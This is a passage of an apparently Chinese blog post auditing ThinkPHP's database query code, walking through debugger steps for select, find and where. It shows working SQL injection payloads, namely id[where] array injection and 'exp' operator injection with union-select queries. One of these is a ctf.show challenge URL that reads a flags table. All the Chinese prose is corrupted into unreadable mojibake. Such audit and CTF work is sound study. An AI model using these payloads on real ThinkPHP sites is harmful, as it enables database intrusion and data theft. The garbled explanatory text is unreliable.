ä¹ä¸ºç©ºçš„ç±»ï¼Œä¹‹åå°±æ˜¯ä¸€ä¸²èµ‹å€¼æ“ä½œ</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-105859339.png" class="">  <p>æˆ‘ä»¬æ­¥å…¥dbæ–¹æ³•ã€‚<br>ç„¶åæ­¥å…¥è¿™ä¸ªDbçš„å®ä¾‹åŒ–æ“ä½œ<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-110020560.png" class=""><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-110249326.png" class=""><br>å…¶å°†æˆ‘ä»¬ä¼ å…¥çš„ç©ºconfigç»§ç»­md5ç¼–ç ï¼Œç„¶åå®éªŒparseConfigæ¥å¾—åˆ°é…ç½®ä¸­çš„æ•°æ®åº“è¿æ¥ä¿¡æ¯<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-110411509.png" class=""><br>å› ä¸ºå…¶configä¸ºç©ºæ‰€ä»¥å…¶ç›´æ¥é€šè¿‡Cæ–¹æ³•æ¥è·å–config.phpçš„é…ç½®ä¿¡æ¯ï¼Œç„¶åç»„æˆæ•°ç»„èµ‹å€¼ç»™configå˜é‡ã€‚ç„¶åè¿”å›<code>$config</code></p><p><code>$options</code>å…¶å®å°±æ˜¯è¢«èµ‹å€¼ä¸ºäº†è¿æ¥ä¿¡æ¯ã€‚<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-110721641.png" class=""><br>ç„¶åå®ä¾‹åŒ–ä¸€ä¸ªmysqlç±»å…¶å‚æ•°ä¸ºè¿æ¥ä¿¡æ¯<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-110945485.png" class=""><br>è¿æ¥é…ç½®è¢«å­˜åˆ°ç±»é‡Œçš„config<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-111143335.png" class=""><br>æœ€åå°±å°†è¿™ä¸ªmysqlç±»è¿”å›<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-111428448.png" class=""><br>ä¹Ÿå°±æ˜¯<code>_db[$linkNum]</code>è¢«èµ‹å€¼ä¸ºè¿™ä¸ªç±»çš„å®ä¾‹<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-111415896.png" class=""><br>ç„¶ådbè¢«èµ‹å€¼ä¸ºè¿™ä¸ªå®ä¾‹<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-111627593.png" class=""><br>æœ€åå°±æ˜¯åˆ¤æ–­æˆ‘ä»¬è¿™ä¸ªtableæ˜¯å¦å­˜åœ¨å¦‚æœå­˜åœ¨å°±è¿”å›æˆ‘ä»¬è¿™ä¸ªé…ç½®å¥½çš„æ¨¡å‹ã€‚<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-111808580.png" class=""><br>æˆ‘ä»¬ä¸€ç›´å¾€ä¸‹è°ƒå›å‘ç°è¿™ä¸ªcheckå…¶å®å°±æ˜¯ç”¨ <code>$this-&gt;query($sql);</code>æ¥æŸ¥è¯¢è¿™ä¸ªè¡¨æ˜¯å­˜åœ¨</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-112105794.png" class="">  <img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-112118423.png" class="">  <p>æˆ‘ä»¬çœ‹è¿™ä¸ªæ¨¡æ¿ç±»å…¶é‡ç‚¹çš„ä¸¤éƒ¨åˆ†å°±æ˜¯dbå±æ€§å’Œexpä¸­çš„selectSqlã€‚<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-112417294.png" class=""><br>è€Œè¿™ä¸ªæ¨¡æ¿è¯­å¥åœ¨æœ€å¼€å§‹å…¶å®å°±è¯­å¥å†™å¥½äº†</p><h2 id="select"><a href="#select" class="headerlink" title="select"></a>select</h2><p>é¦–å…ˆæ˜¯selectå‡½æ•°åœ¨æŸ¥è¯¢æ—¶çš„ä»£ç å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Sql</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$User</span>=<span class="title function_ invoke__">M</span>(<span class="string">&quot;users&quot;</span>);</span><br><span class="line">    <span class="variable">$b</span>=<span class="variable">$User</span>-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„ä»£ç å®ä¾‹åŒ–äº†ä¸€ä¸ªæ¨¡æ¿ï¼Œè¿™ä¸ªæ¨¡æ¿å°±æ˜¯æ•°æ®åº“çš„usersè¡¨ã€‚ç„¶åç›´æ¥è°ƒç”¨selectæ¥æŸ¥è¯¢è¿™ä¸ªè¡¨çš„ä½¿ç”¨å†…å®¹ç›¸å½“äºä½¿ç”¨äº†ä¸‹é¢çš„sqlä»£ç <br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users</span><br></pre></td></tr></table></figure><br>ä¸‹é¢å¼€å§‹è°ƒè¯•</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241201-233114080.png" class="">  <p>å‰é¢å°±æ˜¯åŠ è½½ä¸€ä¸‹é¢„å®šä¹‰çš„ä¸œè¥¿ã€‚<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241201-233325123.png" class=""><br>å†æ¬¡è¿›å…¥dbçš„selectå‡½æ•°ã€‚ä¼ å…¥çš„å‚æ•°<code>$options</code>å°±æ˜¯æˆ‘ä»¬çš„tablename users<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241201-233541547.png" class=""><br>å‰é¢çš„çš„modleæ˜¯ä¸ªç©ºæ•°ç»„ï¼Œ<code>$options[&#39;bind&#39;]</code>ä¹Ÿæ˜¯ç©ºçš„<br>æˆ‘ä»¬æ­¥å…¥buildSelectSqlã€‚<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241201-233727226.png" class=""><br>å†æ­¥å…¥parseSql<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241201-233845473.png" class=""><br>æˆ‘ä»¬å¯ä»¥å‘ç°è¿™é‡Œæ˜¯ä½¿ç”¨str_replace()æ¥å¯¹<code>$sql</code>è¿›è¡Œæ›¿æ¢ã€‚sqlå°±æ˜¯é¢„å®šä¹‰çš„ä¸€ä¸ªsqlæŸ¥è¯¢è¯­å¥å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT%DISTINCT% %FIELD% FROM %TABLE%%FORCE%%JOIN%%WHERE%%GROUP%%HAVING%%ORDER%%LIMIT% %UNION%%LOCK%%COMMENT%</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥å‘ç°å…¶åº”è¯¥å°±æ˜¯é€šè¿‡è¿™ç§æ›¿æ¢ï¼Œä»è€Œè¾¾åˆ°ç”Ÿæˆæœ€ç»ˆçš„sqlè¯­å¥<br>æˆ‘ä»¬ç»§ç»­æ­¥å…¥<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241201-234145531.png" class="">  </p><p>å…¶ä½¿ç”¨array_walkæ¥å›è°ƒå¤„ç†æˆ‘ä»¬çš„å­—ç¬¦ä¸²<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241201-234255582.png" class=""><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241201-234318041.png" class=""><br>æˆ‘ä»¬å¯ä»¥å‘ç°å…¶å®å°±æ˜¯ä½¿ç”¨ç¬¬äºŒä¸ªå‚æ•°çš„ç±»æ–¹æ³•æ¥å¤„ç†ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šè·³åˆ°parseKeyæ–¹æ³•<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241201-234658369.png" class=""><br>å”¯ä¸€æœ‰ç‚¹ç–‘é—®çš„æ˜¯<code>$this</code>ä¼šæŒ‡å‘Mysqlæ§åˆ¶å™¨ä¸æ‡‚ã€‚ä½†æ— ä¼¤å¤§é›…<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241201-234449322.png" class=""><br>æˆ‘ä»¬å¯ä»¥å‘ç°å…¶å°†æˆ‘ä»¬çš„å‚æ•°ç”¨åå¼•å·åŒ…è£¹ï¼Œç„¶åè¿”å›ã€‚</p><p>åé¢çš„æˆ‘å°±ä¸è°ƒäº†ï¼Œéƒ½æ˜¯ç±»ä¼¼äºè¿™ç§æ“ä½œ<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241201-235442247.png" class=""><br>ç„¶åæ­¥å…¥query<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241201-235541565.png" class=""><br>å°†queryStrèµ‹å€¼ä¸ºæˆ‘ä»¬çš„sqlè¯­å¥<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241202-000018625.png" class="">  </p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241202-000042218.png" class="">  <img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241202-000043856.png" class="">  <p>æœ€åä½¿ç”¨PDOè¿›è¡ŒsqlæŸ¥è¯¢</p><h2 id="Optionså¯æ§å¯¼è‡´çš„sqlæ³¨å…¥"><a href="#Optionså¯æ§å¯¼è‡´çš„sqlæ³¨å…¥" class="headerlink" title="$Optionså¯æ§å¯¼è‡´çš„sqlæ³¨å…¥"></a>$Optionså¯æ§å¯¼è‡´çš„sqlæ³¨å…¥</h2><p>æˆ‘ä»¬ä½¿ç”¨sqlæŸ¥è¯¢æœ‰å¦‚ä¸‹ä¿©ç§<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span>=<span class="variable">$User</span>-&gt;<span class="title function_ invoke__">select</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$User</span>-&gt;<span class="title function_ invoke__">find</span>(<span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><br>å…¶ä¸­<code>$id</code>å¯å¡«å¯ä¸å¡«ï¼Œ<code>$id</code>å…¶å®å°±æ˜¯æ‰€è°“çš„<code>$Options</code><br>findå’Œselectè¿™ä¸¤ä¸ªå‡½æ•°å› ä¸º<code>$Options</code>åŸç†å…¶å®æ˜¯ä¸€æ ·çš„ä»£ç ä¹Ÿå¾ˆåƒæ‰€ä»¥æˆ‘è¿™é‡Œå°±ç›´æ¥å®¡selectå‡½æ•°çš„äº†<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.id&#x27;</span>);</span><br><span class="line"><span class="variable">$User</span>=<span class="title function_ invoke__">M</span>(<span class="string">&quot;users&quot;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$User</span>-&gt;<span class="title function_ invoke__">select</span>(<span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><br>é¦–å…ˆå¦‚ä¸Šä»£ç æˆ‘ä»¬å…ˆä¼ ?id=1â€™æ¥è°ƒä¸€è°ƒçœ‹ä¸€ä¸‹æ˜¯å“ªé‡Œå¯¹å‚æ•°è¿›è¡Œäº†å¤„ç†<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-192311628.png" class=""><br>æˆ‘ä»¬è¿›å…¥selectå‡½æ•°ï¼Œä¼šå‘ç°å…¶å…ˆå¯¹åˆ¤æ–­æˆ‘ä»¬çš„å‚æ•°æ˜¯å¦ä¸ºå­—ç¬¦ä¸²æˆ–è€…æ•°å­—ï¼Œå¦‚æœæ˜¯å°±è¿›è¡Œå¤„ç†<br>å…¶å°†æˆ‘ä»¬çš„å‚æ•°ä¼ å…¥<code>$where[id]</code>åœ¨å°†<code>$where</code>ä¼ ç»™æ¸…ç©ºåçš„<code>$options</code>,<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-192646098.png" class=""><br>éšåä¼ å…¥_parseOptions()æ–¹æ³•ï¼Œæˆ‘ä»¬æ­¥å…¥<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-192803981.png" class=""><br>ç„¶åå°†<code>$options</code>å’Œä¸€ä¸ªç©ºæ•°ç»„è¿›è¡Œmerge<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-192924053.png" class=""><br>è¿™ä¸ªå‡½æ•°å¦‚æœè¾“å…¥ç©ºæ•°ç»„ä¸æ­£å¸¸æ•°ç»„ï¼Œåˆå¹¶åå†…å®¹ä¸å˜<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-151800587.png" class="">  </p><p>ç»è¿‡ä¸€æ®µèµ‹å€¼ä¹‹åæ£€æµ‹<code>$options[&#39;where&#39;]</code>æ˜¯å¦ä¸ºç©ºæ˜¯å¦ä¸ºæ•°ç»„ç­‰ï¼Œé€šè¿‡åå°±å¯¹å‚æ•°è¿›è¡ŒäºŒæ¬¡å¤„ç†<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-200710250.png" class=""><br>å…¶å°†<code>$options[&#39;where&#39;]</code>å’Œå…¶keyä¼ å…¥_parseType()è¿›è¡Œå¤„ç†<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-201114142.png" class=""><br>æ­¥å…¥ _parseType()<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-201312553.png" class=""><br>æ­¥å…¥å‘ç°å…¶ä¼šå°†<code>$options[&#39;where&#39;]</code>çš„å†…å®¹ç»è¿‡intvalæ¥å¤„ç†ï¼Œè¿™å¯¼è‡´æˆ‘ä»¬ä¼ å…¥çš„1â€™è¢«è½¬æ¢æˆæ•°å­—1</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±è¦æƒ³åŠæ³•è®©å…¶ä¸è¦è¿›å…¥è¿™ä¸ªæ–¹æ³•ã€‚æˆ‘ä»¬å›é¡¾ä¸€ä¸‹ä¸Šé¢å®¡çš„å°±ä¼šå‘ç°</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-212828301.png" class="">  <p>åªè¦æˆ‘ä»¬è®©<code>$options[&#39;where&#39;]</code>ä¸ä¸ºæ•°ç»„å°±ä¸ä¼šè¿›å…¥_parseType<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-213045323.png" class=""><br>è€Œæ˜¯ç›´æ¥è¿”å›äº†<code>$options</code></p><p>è€Œè¿”å›äº†<code>$options</code>åçš„æµç¨‹å…¶å®æˆ‘ä»¬ä¸Šé¢è°ƒselect()å‡½æ•°æ—¶å·²ç»è°ƒè¿‡äº†<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-213403051.png" class=""><br>å…¶å¯¹æˆ‘ä»¬ä¼ å…¥çš„å†…å®¹è¿›è¡Œæ‹¼æ¥ï¼Œå…¶æ•°ç»„çš„keyä¸ºwhereï¼Œunionå•Šè¿™äº›å‚æ•°åº”è¯¥ä¸å°‘éƒ½æœ‰å¯ä»¥è¿›è¡Œsqlæ³¨å…¥ï¼Œå› ä¸ºæˆ‘ä»¬æœ€å¸¸è§æœ€ç®€å•å°±æ˜¯wereå¯¼è‡´çš„sqlæ³¨å…¥æˆ‘è¿™é‡Œå°±æ¼”ç¤ºè¿™ä¸ªäº†</p><p>æˆ‘ä»¬ä¼ å…¥<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[where]=1&#x27;</span><br></pre></td></tr></table></figure><br>ç»è¿‡ä¸Šé¢çš„æµç¨‹æœ€ç»ˆå°±ä¼šå¯¼è‡´sqlè¯­å¥å˜ä¸º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `users` WHERE 1&#x27; </span><br></pre></td></tr></table></figure><br>æ‰€ä»¥æˆ‘ä»¬åªè¦æˆ‘ä»¬ä¼ å…¥çš„idä¸ºæ•°ç»„å°±å¯ä»¥ç»•è¿‡waf</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-214908420.png" class="">  <img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-215143669.png" class="">  <img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-215600928.png" class="">  <p>ç”šè‡³ç›´æ¥æ³¨å…¥åˆ°%FIELD%ä½¿å¾—è¯­å¥ç›´æ¥å˜ä¸º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select database();</span><br></pre></td></tr></table></figure><br>æ„Ÿè§‰å®¡è¿‡javaåå›è¿‡å¤´å®¡phpä¼šè½»æ¾å¾ˆå¤šã€‚ä¸Šé¢çš„æ¼æ´å®¡è®¡æˆ‘åªçœ‹æ¥payloadå’Œå°±å¤§è‡´èƒ½å®¡å‡ºæ¥äº†</p><h3 id="web573"><a href="#web573" class="headerlink" title="web573"></a>web573</h3><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241211-110912747.png" class="">  <p>å…¶å®å°±æ˜¯ç”¨æˆ‘ä»¬å‰é¢å†™çš„id[where]æ³¨å…¥ï¼Œç„¶åå°±æ˜¯unionæ³¨å…¥çš„è¿‡ç¨‹äº†ã€‚<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241211-111038679.png" class=""><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241211-111125415.png" class=""><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241211-111147086.png" class=""><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://78b70afb-4106-4504-8985-8ee683b2afe0.challenge.ctf.show/?id[where]=0 union select 1,(select flag4s from flags),3,4</span><br></pre></td></tr></table></figure></p><h2 id="where-expæ³¨å…¥"><a href="#where-expæ³¨å…¥" class="headerlink" title="where expæ³¨å…¥"></a>where expæ³¨å…¥</h2><p>å…³äºè¿™ä¸ªå‡½æ•°çš„æ³¨å…¥æˆ‘ä¸ªäººå‡†å¤‡è‡ªå·±å®¡ï¼Œä¸çœ‹ç½‘ä¸Šçš„å®¡è®¡è¿‡ç¨‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.id&#x27;</span>);</span><br><span class="line"><span class="variable">$User</span>=<span class="title function_ invoke__">M</span>(<span class="string">&quot;users&quot;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$User</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$id</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬ç»™idä¼ å…¥1â€™ç®€å•è°ƒè¯•ä¸€ä¸‹<br>ç®€å•è°ƒè¯•äº†ä¸€ä¸‹å‘ç°å…¶å¹¶æ²¡æœ‰è¿‡æ»¤ç›´æ¥å°†å…¶æ‹¼æ¥å†sqlè¯­å¥é‡Œäº†<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-222732401.png" class=""><br>é¦–å…ˆæ£€æµ‹å…¶æ˜¯å¦ä¸ºå­—ç¬¦ä¸²ï¼Œä¸”ä¸ä¸ºç©ºï¼Œç„¶åè¿›è¡Œä¸€ä¸ªèµ‹å€¼çš„é€»è¾‘ï¼Œæœ€åèµ‹å€¼çš„ç»“æœå°±æ˜¯<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$where[&#x27;_string&#x27;]=1&#x27;</span><br></pre></td></tr></table></figure><br>ç„¶åå°†$whereç›´æ¥èµ‹å€¼åˆ°options[â€˜whereâ€™]ä¸­æ„Ÿè§‰å’Œä¸Šé¢çš„å·²ç»æœ‰ç‚¹è”ç³»äº†</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-223107922.png" class="">  <p>è¿™æ¬¡åˆ°è¿™é‡Œè™½ç„¶options[â€˜whereâ€™]æ˜¯æ•°ç»„ï¼Œä½†æ˜¯å› ä¸ºåªæœ‰keyä¸ºidï¼Œusernameï¼Œpasswordæ—¶æ‰ä¼šè¿›å…¥è¿™ä¸ª_parseType()é¢„æ¸²æŸ“æ–¹æ³•ã€‚æ‰€ä»¥å…¶ä¸ä¼šè¢«intval<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-225151721.png" class="">  </p><p>æˆ‘ä»¬ç›´æ¥è°ƒåˆ°whereçš„æ‹¼æ¥é€»è¾‘å»<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-223309284.png" class=""><br>å‰é¢çš„æ“ä½œç”¨å¤„ä¸å¤§ï¼Œæˆ‘ä»¬æ­¥å…¥parseThinkWhereï¼Œ<img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-223353926.png" class=""><br>å¯ä»¥å‘ç°å…¶å¹¶æ²¡æœ‰å¤„ç†è€Œæ˜¯ç›´æ¥èµ‹å€¼<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-223427790.png" class=""><br>ç„¶åè¿”å›è¢«æ‹¬å·åŒ…è£¹çš„<code>$whereStr</code><br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-223522475.png" class=""><br>ç„¶åæ‹¼æ¥æ‹¼æ¥çš„ç»“æœå…¶å®å°±æ˜¯<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> `users` <span class="keyword">WHERE</span> ( <span class="number">1</span><span class="string">&#x27; ) LIMIT 1  </span></span><br></pre></td></tr></table></figure><br>æ˜æ˜¾å¯ä»¥sqlæ³¨å…¥payloadå¦‚ä¸‹<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-223652518.png" class=""><br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php/Home/Index/sql?id=0 ) union select 1,2,database()--+</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çŸ¥é“è¿™æ˜æ˜¾å’Œç½‘ä¸Šçš„expæ³¨å…¥ä¸ä¸€æ ·å•Š<br>çœ‹ä¸€ä¸‹æ–‡ç« å¯ä»¥å‘ç°ç½‘ä¸Šçš„expæ³¨å…¥å…¶å®æ˜¯åº”å¯¹ä¸‹é¢çš„æƒ…å†µ<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$User = D(&#x27;Users&#x27;);</span><br><span class="line">// å…ˆæ„å»ºæŸ¥è¯¢æ¡ä»¶,å†æ‰§è¡ŒæŸ¥è¯¢</span><br><span class="line">$map = array(&#x27;username&#x27; =&gt; $_GET[&#x27;username&#x27;]);</span><br><span class="line">// $map = array(&#x27;username&#x27; =&gt; I(&#x27;username&#x27;));</span><br><span class="line">$user = $User-&gt;where($map)-&gt;find();</span><br><span class="line">var_dump($user);</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶å®šä¹‰äº†<code>$where</code>çš„keyä¸ºusernameã€‚æˆ‘ä»¬æ¥è°ƒä¸€ä¸‹çœ‹çœ‹ä¼šæœ‰ä»€ä¹ˆä¸åŒ</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-225447334.png" class="">  <p>é¦–å…ˆ<code>$this-&gt;options[&#39;where&#39;]</code>ä¼šè¢«ç›´æ¥å¤åˆ¶ä¸º<code>$where</code><br>è€Œå…¶keyå·²ç»æå‰å®šä¹‰äº†ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥çš„usernameæ˜¯ä¼šè¿›å…¥_parseType()çš„ã€‚<br>ä½†æ˜¯ç»è¿‡è°ƒè¯•åä¼šå‘ç°å…¶å¹¶æ²¡æœ‰å¯¹æˆ‘ä»¬çš„å‚æ•°è¿›è¡Œä¿®æ”¹</p><p>æ€€ç–‘æ¸²æŸ“æ˜¯å‡ºç°å†æ‹¼æ¥æ­¥éª¤çš„å¤„ç†ä¸Š</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-230629852.png" class="">  <p>æˆ‘ä»¬ä¸€è·¯å¾€ä¸‹è°ƒå°±ä¼šè°ƒåˆ°parseValue()æ–¹æ³•ã€‚æˆ‘ä»¬å¯ä»¥å‘ç°å¦‚æœä¼ å…¥çš„å‚æ•°ä¸ºå­—ç¬¦ä¸²ï¼Œä¸”valueå€¼ä¸åœ¨bindçš„keyä¸­å°±ä¼šä½¿ç”¨ï¼Œå…¶å°±ä¼šä½¿ç”¨escapeStringæ¥ä½¿å¾—â€™è¢«è½¬ä¹‰ï¼Œç„¶åä½¿ç”¨å¼•å·åŒ…è£¹<br>ç»„æˆçš„sqlè¯­å¥å¦‚ä¸‹<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> `users` <span class="keyword">WHERE</span> `username` <span class="operator">=</span> <span class="string">&#x27;1\&#x27;&#x27; LIMIT 1  </span></span><br></pre></td></tr></table></figure><br>è¿™æ—¶æˆ‘ä¸ªäººè®¤ä¸ºçš„ç»•è¿‡æ–¹æ³•ä¸ºä¸¤ç§<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-231649221.png" class=""><br>ä¸€ç§æ˜¯ç»™bindèµ‹å€¼æˆ‘ä»¬çš„æ³¨å…¥è¯­å¥ï¼Œè¿™æ ·å…¶è¿”å›çš„<code>$value</code>å°±ä¸ä¼šè¢«â€™â€™åŒ…è£¹è‡ªç„¶å°±å¯ä»¥å†æ‹¼æ¥åè¿›è¡Œsqlæ³¨å…¥äº†ã€‚</p><p>ç¬¬äºŒç§åº”è¯¥å°±æ˜¯æˆ‘ä»¬è¦è°ƒçš„expæ³¨å…¥äº†ã€‚æˆ‘ä»¬çœ‹ç¬¬äºŒä¸ªåˆ¤æ–­è¯­å¥å¯ä»¥å‘ç°æˆ‘ä»¬çš„<code>$value[0]</code>åªè¦ä¸ºexpå…¶<code>$value</code>ä¹Ÿæ²¡æœ‰è¢«å•å¼•å·åŒ…è£¹</p><p>æˆ‘è¿™é‡Œå…ˆå°è¯•ç¬¬äºŒç§ï¼Œç¬¬äºŒç§æˆ‘ä»¬çŸ¥é“ä¼ å€¼çš„å˜é‡ï¼Œè€Œç¬¬ä¸€ç§ç›®å‰è¿˜ä¸çŸ¥é“å¦‚ä½•ä¼ å…¥bind</p><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-232721269.png" class="">  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php/Home/Index/sql?name[0]=exp&amp;name[1]= =1 union select 1,2,database();--+</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘åˆè°ƒäº†ä¸€ä¸‹å‘ç°ä¸å¯¹<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-233045091.png" class=""><br>è¿™ä¸ª<code>$exp</code>æ€ä¹ˆè¢«èµ‹å€¼äº†ï¼Œè€Œå½“<code>$exp</code>è¢«èµ‹å€¼ä¸ºexpæ—¶å…¶è¿”å›çš„<br><code>$whereStr</code> å°±æ˜¯æ²¡æœ‰ç»è¿‡parseValueå¤„ç†çš„<code>$key . &#39; &#39; . $val[1];</code>åªèƒ½è¯´è¯¯æ‰“è¯¯æ’å§<br><img src="/2024/11/29/tp%E4%B8%93%E9%A2%98/IMG_20241206-233532276.png" class=""><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚æœæˆ‘ä»¬ä¼ 